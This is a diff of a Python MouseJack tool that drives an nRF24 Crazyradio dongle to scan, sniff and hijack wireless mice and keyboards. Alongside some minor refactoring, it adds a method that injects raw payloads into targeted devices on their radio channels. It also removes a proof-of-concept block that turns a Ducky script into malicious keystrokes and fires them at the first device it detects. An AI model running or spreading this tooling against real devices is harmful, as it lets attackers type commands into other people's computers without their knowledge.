@@ -12,7 +12,7 @@ CHANNEL_DWELL_TIME = 0.1
 
 
 class MouseJack(object):
-    def __init__(self, activate_lna: object = True, reset: object = False):
+    def __init__(self, activate_lna: object = True):
         self.crazy_radio: Optional[nrf24] = None
         self.channel = None
         self.channels = range(2, 84)
@@ -20,7 +20,7 @@ class MouseJack(object):
         self.ping = PING
         self.devices = {}
         self.HID = list(FingerprintRegistry.discover().values())
-        self.init_radio(activate_lna, reset)
+        self.init_radio(activate_lna)
         self.scan_active = False
 
     def close(self):
@@ -28,29 +28,28 @@ class MouseJack(object):
             usb.util.dispose_resources(self.crazy_radio.device)
 
     @staticmethod
-    def hex_to_str(data):
-        return ':'.join('{:02X}'.format(x) for x in data)
-
-    @staticmethod
     def str_to_hex(data):
         return [int(b, 16) for b in data.split(':')]
 
-    def init_radio(self, activate_lna, reset):
+    @staticmethod
+    def hex_to_str(data):
+        return ':'.join('{:02X}'.format(x) for x in data)
+
+    def init_radio(self, activate_lna):
         try:
             self.crazy_radio = nrf24.NRF24(0)
             if activate_lna:
                 self.crazy_radio.avctivate_LNA()
-            # if reset:
-            #     self.crazy_radio.reset_on_linux()
             return True, "Radio initialized successfully"
         except Exception as ex:
             return False, f"Initialization failed: {ex}"
 
     def device_detected(self, address, payload):
         channel = self.channels[self.channel_index]
+        timestamp = datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')
         if address in self.devices:
             self.devices[address]['count'] += 1
-            self.devices[address]['timestamp'] = datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')
+            self.devices[address]['timestamp'] = timestamp
             if channel not in self.devices[address]['channels']:
                 self.devices[address]['channels'].append(channel)
             if self.devices[address]['device'] is None:
@@ -61,7 +60,7 @@ class MouseJack(object):
             self.devices[address] = {}
             self.devices[address]['index'] = len(self.devices)
             self.devices[address]['count'] = 1
-            self.devices[address]['timestamp'] = datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')
+            self.devices[address]['timestamp'] = timestamp
             self.devices[address]['channels'] = [self.channels[self.channel_index]]
             self.devices[address]['address'] = self.str_to_hex(address)[::-1]
             self.devices[address]['device'] = self.get_hid(payload)
@@ -96,8 +95,6 @@ class MouseJack(object):
 
                 if len(data) >= 5:
                     address, payload = data[0:5], data[5:]
-                    print(data)
-
                     if callback:
                         callback(address, payload)
                     else:
@@ -186,6 +183,17 @@ class MouseJack(object):
                     self.set_channel(channel)
                     self.attack(hid(address, payload), mal_code)
 
+    def attack_with_rawdata(self, targets, payload):
+        for address, target in iteritems(targets):
+            payload = list(payload)
+            channels = target['channels']
+            address = target['address']
+            self.crazy_radio.activate_sniffer_mode(address)
+            for channel in channels:
+                self.crazy_radio.set_channel(channel)
+                for rawdata in payload:
+                    self.crazy_radio.send_payload(list(rawdata))
+
     @staticmethod
     def report_address(targets):
         addresses = []
@@ -237,47 +245,3 @@ class Replayer(MouseJack):
             payload_hex = ':'.join(f'{byte:02X}' for byte in payload)
             payloads.append(payload_hex)
         return payloads
-
-
-
-if __name__ == '__main__':
-    #POC
-    def launch_attacks(mj, targets, mal_command):
-        for addr_string, target in iteritems(targets):
-            payload = target['payload']
-            channels = target['channels']
-            address = target['address']
-            hid = target['device']
-
-            mj.sniffer_mode(address)
-
-            if hid:
-                print("HID")
-                for channel in channels:
-                    mj.set_channel(channel)
-                    mj.attack(hid(address, payload), mal_command)
-
-
-    file = open("1.txt", 'r')
-    parser = duckyparser.DuckyParser(file.read())
-
-    mal_code = parser.parse()
-
-    mj = MouseJack()
-    count = 0
-    while count < 2:
-        mj.scan()
-        if mj.devices:
-
-            first_device_address = list(mj.devices.keys())[0]
-            print(f"Sniffing device with address: {first_device_address}")
-            mj.sniff(0.1, first_device_address)
-            count += 1
-
-            device_info = mj.devices[first_device_address]
-            print(device_info)
-
-        else:
-            print("No devices detected. Exiting.")
-
-    launch_attacks(mj, mj.devices, mal_code)
